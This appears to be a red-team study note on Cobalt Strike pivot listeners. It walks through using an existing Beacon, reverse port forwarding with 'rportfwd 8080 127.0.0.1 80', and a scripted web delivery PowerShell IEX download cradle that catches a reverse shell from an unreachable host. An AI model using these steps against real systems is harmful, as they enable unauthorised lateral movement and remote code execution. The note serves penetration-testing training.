# Pivot Listner For Lateral Movement. 
A pivot listener can only be created on an existing Beacon, and not via the normal Listeners menu.  These listeners work in the same way as regular TCP listeners, but in reverse.
telling the existing Beacon to bind and listen on a port, and the new Beacon TCP payload initiates a connection to it.
```
Pivoting > Listener.  
```
This will open a "New Listener" window.

During reverse port forwarding **YOU ALWAYS POINT TO THE TEAM SERVER**.

#### Once you have a beacon on a box, even though it can’t see the teamserver from its OS, Cobalt Strike can tunnel the traffic through the other beacons to the teamserver

So for example you setup a pivot listener on a system. This will capture the reverse shell after you download and exec it. You create pivot listeners directly on the beacons as they’re session based.

At that point 
1) run 
```
rportfwd 8080 127.0.0.1 80
```
where localhost is the team server
2) Then you 
```
attack > scripted web delivery (s)
```
3) Set the URI to something short like /b.
4) Bind it to the pivot listener you started
5) Change to powershell IEX. When you do your encode string, you change http://teamserver:80/b to http://<system where you run rportfwd>:8080/sql2
